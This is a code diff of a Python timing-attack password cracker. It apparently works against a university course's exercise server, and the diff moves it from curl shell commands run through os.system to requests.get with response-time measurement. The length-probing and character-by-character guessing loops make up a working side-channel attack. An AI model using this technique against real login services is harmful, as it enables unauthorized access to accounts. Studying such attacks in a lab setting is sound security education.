@@ -5,6 +5,7 @@ import time as timer
 import Configurations
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor
+import requests
 
 
 # - - - - - - - - - -  LOG SECTION  - - - - - - - - - -
@@ -137,7 +138,7 @@ def create_folder_if_not_exists(folder_path: str) -> None:
 
 # - - - - - - - - - -  PASSWORD SECTION  - - - - - - - - - -
 
-def run_url(url: str) -> None:
+def run_url(url: str) -> float:
     """
     This function request to given url and return it source code as a string.
 
@@ -149,9 +150,12 @@ def run_url(url: str) -> None:
     # urllib.request.urlopen(url)
 
     #yarden
-    os.system(url + ">/dev/null 2>&1")
+    #os.system(url + ">/dev/null 2>&1")
 
+    response = requests.get(url)
     timer.sleep(Configurations.sleep_time)
+    return response.elapsed.total_seconds()
+
 
 
 def check_password_size_thread(url_result_command: str, iterations: int, thread_number: int, logger) -> float:
@@ -169,10 +173,10 @@ def check_password_size_thread(url_result_command: str, iterations: int, thread_
 
     for i in range(iterations):
         # yarden
-        start = time()
-        run_url(url_result_command)
-        end = time()
-        res_time = end - start
+        #start = time()
+        res_time = run_url(url_result_command)
+        #end = time()
+        #res_time = end - start
 
         # aviv
         # res = os.popen(url_time_command).read()
@@ -193,7 +197,7 @@ def warmup() -> None:
 
     :return: None.
     """
-    url_time_command = 'curl -s "http://aoi.ise.bgu.ac.il/?user=test&password=test&difficulty=1"'
+    url_time_command = "http://aoi.ise.bgu.ac.il/?user=test&password=test&difficulty=1"
     run_url(url_time_command)
 
 
@@ -242,9 +246,10 @@ def check_password_size(start_url: str = "", end_url: str = "", max_password_siz
 
     while not distinct:
         for i in range(0, max_password_size + 1, 1):
-            url_result_command = f'curl -s "{start_url}{Configurations.default_character * i}{end_url}"'
+            url_result_command = f'{start_url}{Configurations.default_character * i}{end_url}'
             url_time_command = 'curl -s -w "%{{time_total}}" "{start_url}{password}{end_url}\"'.format(
                 time_total='time_total', start_url=start_url, password=Configurations.default_character * i, end_url=end_url)
+
 
             if Configurations.use_thread_pool:
                 future_results.append(thread_pool.submit(check_password_size_thread, url_result_command, Configurations.attempts, i, logger))
@@ -299,10 +304,10 @@ def crack_password_thread(url_time_command, url_result_command, ch, current_pass
 
         else:
             # yarden
-            start = time()
-            run_url(url_result_command)
-            end = time()
-            res_time = end - start
+            #start = time()
+            res_time = run_url(url_result_command)
+            #end = time()
+            #res_time = end - start
 
             # aviv
             # res = os.popen(url_time_command, ).read()
@@ -340,7 +345,7 @@ def crack_password(password_size: int, start_url: str = "", end_url: str = "", l
                 current_password = f'{password}{ch}{Configurations.default_character * ((password_size - len(password) - 1))}'
                 url_time_command = 'curl -s -w "%{{time_total}}" "{start_url}{password}{end_url}\"'.format(
                     time_total='time_total', start_url=start_url, password=current_password, end_url=end_url)
-                url_result_command = f'curl -s "{start_url}{current_password}{end_url}"'
+                url_result_command = f'{start_url}{current_password}{end_url}'
 
 
                 future_results.append(
@@ -363,7 +368,7 @@ def crack_password(password_size: int, start_url: str = "", end_url: str = "", l
                 current_password = f'{password}{ch}{Configurations.default_character * ((password_size - len(password) - 1))}'
                 url_time_command = 'curl -s -w "%{{time_total}}" "{start_url}{password}{end_url}\"'.format(
                     time_total='time_total', start_url=start_url, password=current_password, end_url=end_url)
-                url_result_command = f'curl -s "{start_url}{current_password}{end_url}"'
+                url_result_command = f'{start_url}{current_password}{end_url}'
 
                 if Configurations.use_thread_pool:
                     future_results.append(thread_pool.submit(crack_password_thread, url_time_command, url_result_command, ch, current_password, Configurations.attempts, logger))
